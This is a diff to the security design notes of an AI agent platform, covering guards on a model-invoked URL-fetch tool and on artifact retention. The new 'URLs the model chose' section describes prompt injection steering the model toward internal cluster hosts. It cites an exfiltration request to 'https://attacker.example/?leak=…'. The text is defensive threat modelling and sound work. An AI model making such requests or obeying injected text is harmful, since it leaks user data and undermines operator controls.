@@ -335,6 +335,43 @@ stops* — and (b) for OAuth entries, that the registered client is named
 `AgentDure — <project>` and that the token carries the grant of whoever connected the
 server.
 
+### URLs the model chose
+
+Everything above concerns addresses an **operator registered**, where validation at
+registration is the first control and the dispatch check is the second — narrowing, not
+closing, the window between them. The `FetchUrl` builtin has no first control: the model names
+the address, and a model is talked into things by the text it reads. `src/infrastructure/net/httpResource.ts`
+is the only place such an address is requested, and its rules are load-bearing rather than
+defence in depth:
+
+- **The internal-host exemption is never consulted.** `MCP_INTERNAL_HOST_SUFFIXES` exists so
+  this app can reach its own cluster MCP services. Honouring it here would turn one prompt
+  injection into a read of `http://mcp-argocd.agent-mcps.svc.cluster.local/`.
+  `tests/architecture.test.ts` fails if the adapter so much as imports `skipsUrlGuard`.
+- **Nothing authenticates.** No tenant header, no MCP OAuth token, no Slack token, no caller
+  headers forwarded. Always GET, never a body. A cross-origin redirect cannot forward what was
+  never attached — and `fetchPublicUrl` refuses one anyway.
+- **Refusals are generalised.** `PublicFetchError` names the host it refused; handing that to a
+  model turns the tool into an oracle for which internal names exist. The caller gets "that
+  address is not reachable from here" and the detail goes to the log, origin only — a URL is
+  often itself the credential.
+- **Bounded per run.** `MAX_URL_FETCHES_PER_RUN` (20) caps the *number* of requests, which no
+  other budget does. "Many requests, all failing" is the shape a network sweep takes.
+- **Off by default.** A version opts in with `parameters.urlFetch`; the capability is derived
+  from the injected dependency, so the Playground preview and the run cannot disagree.
+
+**What this does not stop.** A host that is public but sensitive — an IP-allowlisted SaaS that
+trusts the pod's egress address — passes the guard. So does exfiltration: a model talked into
+requesting `https://attacker.example/?leak=…` is making an ordinary outbound request, and PII
+filtering does not help, because the fetch needs the *restored* argument (a masked URL does not
+resolve). This is the same limit already stated for MCP tool arguments below; the difference is
+that a URL is a lower-friction channel.
+
+**And what it costs.** This exposure existed before, in a separate pod with no credentials of
+its own. It now runs in the app process, which holds the AES master key, the DynamoDB role and
+the Slack tokens — so the blast radius of any SSRF-adjacent defect is larger, and the app's
+egress policy has to be wide enough to reach the open web. Mitigated, not removed.
+
 ## MCP OAuth
 
 Registry entries may carry an `auth` block discovered once at registration (RFC 9728
@@ -507,10 +544,22 @@ Other properties worth knowing:
     would change nothing about who can reach those objects, which are already public — so
     **if the bucket was ever public-read, its existing objects still are.** Making it private
     is the operator's step, and old rows stop resolving when it happens.
-  - **Nothing in the app expires an object.** DynamoDB TTL removes the chat row silently — the
-    app never observes the expiry — so only the bucket can expire images on the same clock.
-    Attach a lifecycle rule matching `CHAT_RETENTION_DAYS`; it is on the deployment checklist
-    in [OPERATIONS.md](OPERATIONS.md#operational-checklist-for-a-new-deployment).
+  - **Nothing in the app expires an object.** DynamoDB TTL removes a row silently — the app
+    never observes the expiry — so only the bucket can expire objects on the same clock.
+    Attach a lifecycle rule per prefix; it is on the deployment checklist in
+    [OPERATIONS.md](OPERATIONS.md#operational-checklist-for-a-new-deployment).
+- **Artifact rows** name every object a run produced, which is what makes a stored image or
+  document listable and removable at all. Three consequences worth stating:
+  - A row keeps a **500-character excerpt of the prompt** so a gallery is legible. That is user
+    text living for `ARTIFACT_RETENTION_DAYS`, past the chat message that carried it. PII
+    filtering bounds what the *model* sees, never what is stored.
+  - A project's artifacts tab is readable by the project's owner and by admins — the same rule
+    traces use, and for the same reason (they hold other people's runtime output). It is a
+    wider exposure than traces in practice: traces are sampled and keep 30 days, artifacts are
+    every object and keep 180.
+  - Deleting an artifact removes the object first and the row second, so an interrupted delete
+    converges on retry. A chat message keeps its own copy of the key, so the transcript renders
+    the image as unavailable afterwards; the confirmation says so before the fact.
 
 ## Operational notes
 
